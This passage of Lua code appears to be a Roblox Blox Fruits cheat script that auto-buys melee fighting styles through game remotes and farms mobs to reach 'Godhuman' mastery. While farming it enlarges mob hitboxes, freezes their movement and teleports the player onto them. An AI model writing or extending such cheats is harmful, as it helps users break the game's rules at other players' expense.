                                        if _G.GodhumanWeaponSelected == "Black Leg" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Electro") and _G.GodhumanInfo['Electro'] and _G.GodhumanInfo['Electro'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Electro") and not LP.Character:FindFirstChild("Electro") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Electro"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Electro'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                            if LP.Backpack:FindFirstChild("Electro") then
                                                _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                            elseif LP.Character:FindFirstChild("Electro") then
                                                _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Electro"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Electro" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Fishman Karate") and _G.GodhumanInfo['Fishman Karate'] and _G.GodhumanInfo['Fishman Karate'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Fishman Karate") and not LP.Character:FindFirstChild("Fishman Karate") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Fishman Karate"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Fishman Karate'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                            if LP.Backpack:FindFirstChild("Fishman Karate") then
                                                _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                            elseif LP.Character:FindFirstChild("Fishman Karate") then
                                                _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Fishman Karate"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Fishman Karate" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Dragon Claw") and _G.GodhumanInfo['Dragon Claw'] and _G.GodhumanInfo['Dragon Claw'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Dragon Claw") and not LP.Character:FindFirstChild("Dragon Claw") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Dragon Claw"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Dragon Claw'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                            if LP.Backpack:FindFirstChild("Dragon Claw") then
                                                _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                            elseif LP.Character:FindFirstChild("Dragon Claw") then
                                                _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Dragon Claw"] = false
                                        end
                                    else
                                        if _G.GodhumanWeaponSelected == "Dragon Claw" then
                                            _G.GodhumanWeaponSelected = false
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 then
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Superhuman") and _G.GodhumanInfo['Superhuman'] and _G.GodhumanInfo['Superhuman'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Superhuman") and not LP.Character:FindFirstChild("Superhuman") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Superhuman"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Superhuman'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                                if LP.Backpack:FindFirstChild("Superhuman") then
                                                    _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                                elseif LP.Character:FindFirstChild("Superhuman") then
                                                    _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Superhuman"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Superhuman" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                end
                                if _G.GodhumanInfo["Black Leg"] >= 400 and _G.GodhumanInfo["Electro"] >= 400 and _G.GodhumanInfo["Fishman Karate"] >= 400 and _G.GodhumanInfo["Dragon Claw"] >= 400 and _G.GodhumanInfo["Superhuman"] >= 400 then
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Death Step") and _G.GodhumanInfo['Death Step'] and _G.GodhumanInfo['Death Step'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Death Step") and not LP.Character:FindFirstChild("Death Step") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Death Step"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Death Step'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                                if LP.Backpack:FindFirstChild("Death Step") then
                                                    _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                                elseif LP.Character:FindFirstChild("Death Step") then
                                                    _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Death Step"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Death Step" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Sharkman Karate") and _G.GodhumanInfo['Sharkman Karate'] and _G.GodhumanInfo['Sharkman Karate'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Sharkman Karate") and not LP.Character:FindFirstChild("Sharkman Karate") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Sharkman Karate"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Sharkman Karate'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                                if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                                    _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                                elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                                    _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                                end
                                            else
                                                if second_sea then
                                                    FarmWaterKeyGH = true
                                                else
                                                    teleportToSecondSea()
                                                end
                                                _G.GodhumanInfo["Sharkman Karate"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Sharkman Karate" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Electric Claw") and _G.GodhumanInfo['Electric Claw'] and _G.GodhumanInfo['Electric Claw'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Electric Claw") and not LP.Character:FindFirstChild("Electric Claw") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Electric Claw"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Electric Claw'] then
                                            if useNearestEntrance(CFrame.new(-389.768494, 331.860565, 685.700256, 0.992786944, -4.46675372e-08, -0.119891919, 4.67511327e-08, 1, 1.45662709e-08, 0.119891919, -2.00662864e-08, 0.992786944)) then
                                                StopTween()
                                            end
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start")
                                            wait(1)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                            wait(.08)
                                            if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                                if LP.Backpack:FindFirstChild("Electric Claw") then
                                                    _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                                elseif LP.Character:FindFirstChild("Electric Claw") then
                                                    _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                                end
                                            else
                                                _G.GodhumanInfo["Electric Claw"] = false
                                            end
                                        else
                                            if _G.GodhumanWeaponSelected == "Electric Claw" then
                                                _G.GodhumanWeaponSelected = false
                                            end
                                        end
                                    end
                                    if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Dragon Talon") and _G.GodhumanInfo['Dragon Talon'] and _G.GodhumanInfo['Dragon Talon'] < 400 then
                                        if not LP.Backpack:FindFirstChild("Dragon Talon") and not LP.Character:FindFirstChild("Dragon Talon") then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                        end
                                        if not third_sea then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                        else
                                            _G.GodhumanWeaponSelected = "Dragon Talon"
                                            local plrLevel = LP.Data.Level.Value
                                            local mobList = {}
                                            if plrLevel >= 1500 and third_sea then
                                                mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                            end
                                            local farmMasTarget = getClosest(mobList)
                                            if farmMasTarget then
                                                if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                    repeat task.wait()
                                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                        farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                        farmMasTarget.HumanoidRootPart.CanCollide = false
                                                        farmMasTarget.Humanoid.WalkSpeed = 0
                                                        farmMasTarget.Head.CanCollide = false
                                                        BringMobFarm = true
                                                        PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                        EquipWeapon("Melee")
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                        _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                        farmMasTarget.HumanoidRootPart.Transparency = 1
                                                    until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                                else
                                                    if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                        if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    end
                                                end
                                            else
                                                for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                    if getClosest(mobList) then break end
                                                    if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                        repeat wait()
                                                            if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                                StopTween()
                                                            end
                                                            toPoint(FMSpawnPoint * OffsetCFrame())
                                                        until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                    end
                                                end 
                                            end
                                        end
                                    else
                                        if not _G.GodhumanInfo['Dragon Talon'] then
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon", true)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                            wait(.08)
                                            if not LP.Backpack:FindFirstChild("Dragon Talon") and not LP.Character:FindFirstChild("Dragon Talon") then
